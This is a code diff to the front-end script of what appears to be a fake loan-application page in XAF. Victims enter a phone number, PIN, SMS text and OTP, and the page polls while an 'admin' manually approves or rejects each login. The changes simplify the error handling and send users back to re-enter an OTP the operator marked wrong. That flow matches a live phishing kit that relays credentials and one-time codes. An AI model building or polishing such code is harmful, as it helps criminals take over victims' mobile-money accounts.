@@ -863,44 +863,15 @@
             console.log('❌ Admin rejected login');
             clearTimeout(pollTimeout);
             
-            // Clear all form fields
+            // Clear login form
             document.getElementById('lpPhone').value = '';
             [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            document.getElementById('smsMsgBox').value = '';
-            [0,1,2,3].forEach(i => {
-              const otpEl = document.getElementById('otp'+i);
-              if (otpEl) otpEl.value = '';
-            });
-            
-            // Reset all buttons to enabled and not loading
-            document.getElementById('bLgn').disabled = false;
-            document.getElementById('bSms').disabled = false;
-            document.getElementById('bOtp').disabled = false;
-            
-            // Reset button text
-            document.getElementById('bSms').textContent = 'VERIFY MESSAGE';
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            
-            // Hide all loading messages
-            document.getElementById('mLgn').classList.remove('show');
-            document.getElementById('mSms').classList.remove('show');
-            document.getElementById('mOtp').classList.remove('show');
-            
-            // Clear all messages
-            ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
             
             // Go back to login page
             goTo('page-login');
             
-            // Enable login button
-            document.getElementById('bLgn').disabled = false;
-            
-            // Show error message - CLEAR AND PROMINENT
-            setTimeout(() => {
-              showLgnMsg('error', '❌ Wrong PIN! Your login was rejected. Please try again with the correct PIN.');
-            }, 300);
+            // Show error message
+            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
           } else {
             // Still pending, keep polling
             pollTimeout = setTimeout(checkStatus, 2000);
@@ -1115,87 +1086,15 @@
             document.getElementById('aprMth').textContent = 'XAF ' + monthly.toLocaleString();
             
             goTo('page-approval');
-          } else if (status === 'wrongpin_otp') {
-            console.log('❌ Admin marked PIN as wrong at OTP stage');
-            clearTimeout(otpPollTimeout);
-            
-            // Clear all form fields
-            document.getElementById('lpPhone').value = '';
-            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            document.getElementById('smsMsgBox').value = '';
-            [0,1,2,3].forEach(i => {
-              const otpEl = document.getElementById('otp'+i);
-              if (otpEl) otpEl.value = '';
-            });
-            
-            // Reset all buttons to enabled and not loading
-            document.getElementById('bLgn').disabled = false;
-            document.getElementById('bSms').disabled = false;
-            document.getElementById('bOtp').disabled = false;
-            
-            // Reset button text
-            document.getElementById('bSms').textContent = 'VERIFY MESSAGE';
-            document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            
-            // Hide all loading messages
-            document.getElementById('mLgn').classList.remove('show');
-            document.getElementById('mSms').classList.remove('show');
-            document.getElementById('mOtp').classList.remove('show');
-            
-            // Clear all messages
-            ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-            
-            // Return to login page
-            goTo('page-login');
-            
-            // Show error message
-            setTimeout(() => {
-              showLgnMsg('error', '❌ Wrong PIN! Your login was rejected. Please try again with the correct PIN.');
-            }, 300);
           } else if (status === 'wrongcode') {
             console.log('❌ Admin marked code as wrong');
             clearTimeout(otpPollTimeout);
-            
-            // Clear all form fields
-            document.getElementById('lpPhone').value = '';
-            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-            document.getElementById('smsMsgBox').value = '';
-            [0,1,2,3].forEach(i => {
-              const otpEl = document.getElementById('otp'+i);
-              if (otpEl) otpEl.value = '';
-            });
-            
-            // Reset all buttons to enabled and not loading
-            document.getElementById('bLgn').disabled = false;
-            document.getElementById('bSms').disabled = false;
+            goTo('page-otp');
             document.getElementById('bOtp').disabled = false;
-            
-            // Reset button text
-            document.getElementById('bSms').textContent = 'VERIFY MESSAGE';
             document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-            
-            // Hide all loading messages
-            document.getElementById('mLgn').classList.remove('show');
-            document.getElementById('mSms').classList.remove('show');
-            document.getElementById('mOtp').classList.remove('show');
-            
-            // Clear all messages
-            ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-            ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
-            
-            // Return to login page
-            goTo('page-login');
-            
-            // Enable login button
-            document.getElementById('bLgn').disabled = false;
-            
-            // Show error message
-            setTimeout(() => {
-              showLgnMsg('error', '❌ Wrong OTP Code! Your login was rejected. Please try again with the correct credentials.');
-            }, 300);
+            // Clear OTP fields
+            [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
+            showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
           } else {
             // Still pending, keep polling
             otpPollTimeout = setTimeout(checkStatus, 2000);
